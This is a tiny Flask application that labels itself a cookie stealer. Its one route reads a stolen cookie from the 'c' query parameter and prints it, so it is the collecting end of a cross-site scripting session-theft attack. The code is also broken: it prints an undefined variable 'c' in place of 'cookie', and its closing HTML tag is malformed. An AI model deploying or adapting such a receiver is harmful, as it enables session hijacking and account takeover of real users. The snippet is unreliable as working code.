from flask import Flask, request, redirect

app = Flask(__name__)

@app.route("/")
def home_view():
    cookie = request.args.get('c')
    print("This is the cookie: " + c)
    return "<h1>Cookie stealer in action</h>"
